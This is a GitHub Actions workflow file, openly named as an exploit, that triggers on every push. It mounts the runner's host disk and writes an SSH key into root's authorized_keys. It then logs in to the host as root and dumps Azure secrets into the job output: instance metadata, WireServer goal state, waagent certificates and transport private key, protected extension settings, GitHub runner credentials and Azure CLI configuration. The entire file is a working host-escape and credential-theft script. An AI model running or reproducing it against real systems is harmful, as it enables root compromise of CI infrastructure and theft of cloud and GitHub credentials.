name: github-actions-complete-exploitation
run-name: GitHub Actions Azure Infrastructure Compromise
on: [push]
jobs:
  exploit:
    runs-on: ubuntu-latest
    steps:
      - name: Container Escape and Infrastructure Compromise
        run: |
          sudo mkdir -p /mnt/host
          sudo mount /dev/sda1 /mnt/host
          ssh-keygen -t ed25519 -f /tmp/key -N "" -q
          sudo mkdir -p /mnt/host/root/.ssh
          sudo cp /tmp/key.pub /mnt/host/root/.ssh/authorized_keys
          sudo chown -R 0:0 /mnt/host/root/.ssh
          sudo chmod 700 /mnt/host/root/.ssh
          sudo chmod 600 /mnt/host/root/.ssh/authorized_keys
          
          HOST_IP=$(hostname -I | awk '{print $1}')
          
          ssh -i /tmp/key -o StrictHostKeyChecking=no -T root@$HOST_IP << 'EOF'
          printf "\n[SYSTEM INFORMATION]\n"
          printf "User: %s\n" "$(whoami)"
          printf "UID: %s\n" "$(id -u)"
          printf "Hostname: %s\n" "$(hostname)"
          printf "Kernel: %s\n" "$(uname -r)"
          
          printf "\n[AZURE IMDS METADATA]\n"
          curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | python3 -m json.tool
          
          printf "\n[AZURE WIRESERVER GOALSTATE]\n"
          curl -s -H "x-ms-version: 2012-11-30" "http://168.63.129.16/machine?comp=goalstate" | head -100
          
          printf "\n[WAAGENT CACHED GOALSTATE]\n"
          cat /var/lib/waagent/GoalState.1.xml
          
          printf "\n[WAAGENT SHARED CONFIGURATION]\n"
          cat /var/lib/waagent/SharedConfig.xml
          
          printf "\n[WAAGENT CERTIFICATES]\n"
          cat /var/lib/waagent/Certificates.xml
          
          printf "\n[OVF ENVIRONMENT]\n"
          cat /var/lib/waagent/ovf-env.xml
          
          printf "\n[AZURE TRANSPORT PRIVATE KEY]\n"
          cat /var/lib/waagent/TransportPrivate.pem
          
          printf "\n[AZURE INSTANCE CERTIFICATES]\n"
          ls -la /var/lib/waagent/*.prv | head -5
          cat /var/lib/waagent/*.prv | head -50
          
          printf "\n[EXTENSION PROTECTED SETTINGS]\n"
          find /var/lib/waagent -name "*.settings" -exec cat {} \; | grep -A 5 "protectedSettings"
          
          printf "\n[GITHUB RUNNER CREDENTIALS]\n"
          cat /home/runner/actions-runner/cached/.credentials
          
          printf "\n[AZURE CLI CONFIGURATION]\n"
          cat /root/.azure/azureProfile.json
          cat /root/.azure/config
          
          printf "\n[AZURE CLI COMMAND HISTORY]\n"
          grep "command args" /root/.azure/commands/*.log | head -10
          
          printf "\n[NETWORK CONNECTIONS]\n"
          netstat -tnp | grep -E "140.82|20.85|20.209|168.63|169.254"
          
          printf "\n[ATTESTED DATA DECODED]\n"
          curl -s -H "Metadata:true" "http://169.254.169.254/metadata/attested/document?api-version=2021-01-01" | jq -r .signature | base64 -d > /tmp/attested.der
          openssl pkcs7 -print -inform DER -in /tmp/attested.der 2>/dev/null | grep -A 20 "d.data"
          
          printf "\n[EXPLOITATION SUMMARY]\n"
          printf "Container Escape: SUCCESS\n"
          printf "Root Access: uid=0(root)\n"
          printf "Azure Subscription: %s\n" "$(curl -s -H Metadata:true http://169.254.169.254/metadata/instance/compute/subscriptionId?api-version=2021-02-01&format=text)"
          printf "Resource Group: %s\n" "$(curl -s -H Metadata:true http://169.254.169.254/metadata/instance/compute/resourceGroupName?api-version=2021-02-01&format=text)"
          printf "VM Name: %s\n" "$(curl -s -H Metadata:true http://169.254.169.254/metadata/instance/compute/name?api-version=2021-02-01&format=text)"
          printf "Azure WireServer: ACCESSIBLE\n"
          printf "Transport Keys: EXTRACTED\n"
          printf "GitHub Credentials: EXTRACTED\n"
          EOF
